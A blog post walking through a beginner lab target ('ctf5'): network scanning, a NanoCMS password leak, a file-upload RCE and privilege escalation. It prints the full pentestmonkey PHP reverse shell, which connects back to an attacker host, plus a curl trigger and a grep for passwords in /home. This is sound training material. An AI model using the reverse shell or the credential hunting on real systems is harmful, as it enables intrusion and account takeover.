<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>20240808 ctf5 | EZTSEC</title><meta name="author" content="Ethan"><meta name="copyright" content="Ethan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="The difficulty of this target seems not high, and for beginners who are new to this, the excessive amount of port information can lead to a chaotic collection of information, so it is necessary to org">
<meta property="og:type" content="article">
<meta property="og:title" content="20240808 ctf5">
<meta property="og:url" content="http://eztsec.xyz/2024/08/09/20240808-ctf5/index.html">
<meta property="og:site_name" content="EZTSEC">
<meta property="og:description" content="The difficulty of this target seems not high, and for beginners who are new to this, the excessive amount of port information can lead to a chaotic collection of information, so it is necessary to org">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://eztsec.xyz/img/11.jpg">
<meta property="article:published_time" content="2024-08-09T03:28:48.000Z">
<meta property="article:modified_time" content="2024-08-10T20:35:34.133Z">
<meta property="article:author" content="Ethan">
<meta property="article:tag" content="Information Gathering">
<meta property="article:tag" content="File Upload">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://eztsec.xyz/img/11.jpg"><link rel="shortcut icon" href="/img/749ffac0c6014f168ef4f265323b4512!400x400.jpeg"><link rel="canonical" href="http://eztsec.xyz/2024/08/09/20240808-ctf5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?b144796d7a023ff659b245c79a1bfef9";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '20240808 ctf5',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-11 04:35:34'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/w700d1q75cms.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/11.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="EZTSEC"><span class="site-name">EZTSEC</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">20240808 ctf5</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-09T03:28:48.000Z" title="Created 2024-08-09 11:28:48">2024-08-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-08-10T20:35:34.133Z" title="Updated 2024-08-11 04:35:34">2024-08-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Target-Range/">Target Range</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Target-Range/Beginner-Level-Target-Range/">Beginner Level Target Range</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/privilege-escalation/">privilege escalation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/privilege-escalation/sudo-Privilege-Escalation/">sudo Privilege Escalation</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">869</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>5mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="20240808 ctf5"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>The difficulty of this target seems not high, and for beginners who are new to this, the excessive amount of port information can lead to a chaotic collection of information, so it is necessary to organize the information well and try more.At the same time, one should pay attention to vulnerabilities that could lead to information leakage, as these vulnerabilities can also serve as points of entry for an attack.</p>
<h1 id="20240808-ctf5"><a href="#20240808-ctf5" class="headerlink" title="20240808 ctf5"></a>20240808 ctf5</h1><h2 id="Host-Discovery"><a href="#Host-Discovery" class="headerlink" title="Host Discovery"></a>Host Discovery</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l </span><br><span class="line">&amp;&amp;nmap -sP --min-rate 10000 192.168.48.0/24</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808151315-gyg1wjy.png" alt="image">​</p>
<h2 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 10000 192.168.48.136</span><br><span class="line">nmap --script=vuln --min-rate 10000 -sV -O 192.168.48.136 -p22,25,80,110,111,139,143,445,901,3306,47871</span><br><span class="line">nmap --script=vuln --min-rate 10000 192.168.48.136 -p22,25,80,110,111,139,143,445,901,3306,47871</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808151337-a2p9sfg.png" alt="image">​</p>
<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808151055-55uyk87.png" alt="image">​<br>There are a lot of ports, and from the scan results, there are no unauthorized access ports, so you can start by checking the web information from port 80.<br>​<img src="/2024/08/09/20240808-ctf5/image-20240808153234-cras7f6.png" alt="image">​<br>Discovery of Two Backend Login Interfaces<br>​<img src="/2024/08/09/20240808-ctf5/image-20240808153749-f7uzqjj.png" alt="image">​</p>
<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808153800-4xsy89c.png" alt="image">​</p>
<h2 id="Vulnerability-Exploitation"><a href="#Vulnerability-Exploitation" class="headerlink" title="Vulnerability Exploitation"></a>Vulnerability Exploitation</h2><p>In NanoCMS, the path &#x2F;data&#x2F;pagesdata.txt has a password leak.</p>
<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808154144-v6tjf43.png" alt="image">​</p>
<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808154327-dps3yss.png" alt="image">​</p>
<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808154414-9rxhxve.png" alt="image">​</p>
<p>Account Password: admin &#x2F; shnnon<br>Log in to the NanoCMS backend.<br>​<img src="/2024/08/09/20240808-ctf5/image-20240808154633-lkh4vd7.png" alt="image">​</p>
<p>There is a file upload RCE (Remote Code Execution) vulnerability in the backend, which allows you to directly write a shell.</p>
<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808160941-r50vsv9.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &lt;?php</span><br><span class="line">  // php-reverse-shell - A Reverse Shell implementation <span class="keyword">in</span> PHP</span><br><span class="line">  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line"></span><br><span class="line">  set_time_limit (0);</span><br><span class="line">  <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="string">&#x27;192.168.48.133&#x27;</span>;  // You have changed this</span><br><span class="line">  <span class="variable">$port</span> = 8888;  // And this</span><br><span class="line">  <span class="variable">$chunk_size</span> = 1400;</span><br><span class="line">  <span class="variable">$write_a</span> = null;</span><br><span class="line">  <span class="variable">$error_a</span> = null;</span><br><span class="line">  <span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line">  <span class="variable">$daemon</span> = 0;</span><br><span class="line">  <span class="variable">$debug</span> = 0;</span><br><span class="line"></span><br><span class="line">  //</span><br><span class="line">  // Daemonise ourself <span class="keyword">if</span> possible to avoid zombies later</span><br><span class="line">  //</span><br><span class="line"></span><br><span class="line">  // pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">  // our php process and avoid zombies.  Worth a try...</span><br><span class="line">  <span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">    // Fork and have the parent process <span class="built_in">exit</span></span><br><span class="line">    <span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -1) &#123;</span><br><span class="line">      printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(1);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">      <span class="built_in">exit</span>(0);  // Parent exits</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Make the current process a session leader</span><br><span class="line">    // Will only succeed <span class="keyword">if</span> we forked</span><br><span class="line">    <span class="keyword">if</span> (posix_setsid() == -1) &#123;</span><br><span class="line">      printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$daemon</span> = 1;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Change to a safe directory</span><br><span class="line">  <span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  // Remove any <span class="built_in">umask</span> we inherited</span><br><span class="line">  <span class="built_in">umask</span>(0);</span><br><span class="line"></span><br><span class="line">  //</span><br><span class="line">  // Do the reverse shell...</span><br><span class="line">  //</span><br><span class="line"></span><br><span class="line">  // Open reverse connection</span><br><span class="line">  <span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">    printit(<span class="string">&quot;<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Spawn shell process</span><br><span class="line">  <span class="variable">$descriptorspec</span> = array(</span><br><span class="line">    0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="built_in">read</span> from</span><br><span class="line">    1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to</span><br><span class="line">    2 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Set everything to non-blocking</span><br><span class="line">  // Reason: Occsionally reads will block, even though stream_select tells us they won<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">  stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">  stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">  stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">  stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  while (1) &#123;</span></span><br><span class="line"><span class="string">    // Check for end of TCP connection</span></span><br><span class="line"><span class="string">    if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">      printit(&quot;ERROR: Shell connection terminated&quot;);</span></span><br><span class="line"><span class="string">      break;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // Check for end of STDOUT</span></span><br><span class="line"><span class="string">    if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">      printit(&quot;ERROR: Shell process terminated&quot;);</span></span><br><span class="line"><span class="string">      break;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">    // command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">    $read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">    // data to process&#x27;</span>s STDIN</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">      fwrite(<span class="variable">$pipes</span>[0], <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // If we can <span class="built_in">read</span> from the process<span class="string">&#x27;s STDOUT</span></span><br><span class="line"><span class="string">    // send data down tcp connection</span></span><br><span class="line"><span class="string">    if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">      if ($debug) printit(&quot;STDOUT READ&quot;);</span></span><br><span class="line"><span class="string">      $input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">      if ($debug) printit(&quot;STDOUT: $input&quot;);</span></span><br><span class="line"><span class="string">      fwrite($sock, $input);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // If we can read from the process&#x27;</span>s STDERR</span><br><span class="line">    // send data down tcp connection</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[2], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[2], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">      fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fclose(<span class="variable">$sock</span>);</span><br><span class="line">  fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line">  fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">  fclose(<span class="variable">$pipes</span>[2]);</span><br><span class="line">  proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">  // Like <span class="built_in">print</span>, but does nothing <span class="keyword">if</span> we<span class="string">&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="string">  // (I can&#x27;</span>t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line">  <span class="keyword">function</span> printit (<span class="variable">$string</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&quot;<span class="variable">$string</span></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ?&gt; </span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.48.136/~andy/data/pages/8888.php</span><br></pre></td></tr></table></figure>

<p>Successfully rebound the shell.</p>
<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808161020-f6iew09.png" alt="image">​</p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Search for files containing the keyword “pass” in the home directory.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R -i pass /home/ 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808192010-w60fgsc.png" alt="image">​</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808192039-d9kjj7t.png" alt="image">​</p>
<p>Found the root password: 50$cent</p>
<p>​<img src="/2024/08/09/20240808-ctf5/image-20240808192542-lob53qu.png" alt="image">​</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Information-Gathering/">Information Gathering</a><a class="post-meta__tags" href="/tags/File-Upload/">File Upload</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/09/20240808-ctf7/" title="20240808 ctf7"><img class="cover" src="/img/12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">20240808 ctf7</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/31/20240719-AdmX-new/" title="20240719 AdmX_new"><img class="cover" src="/img/10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">20240719 AdmX_new</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/08/09/20240808-ctf7/" title="20240808 ctf7"><img class="cover" src="/img/12.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-09</div><div class="title">20240808 ctf7</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/w700d1q75cms.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ethan</div><div class="author-info__description">Share my experience with shooting machines, urge myself to learn, and update regularly</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div 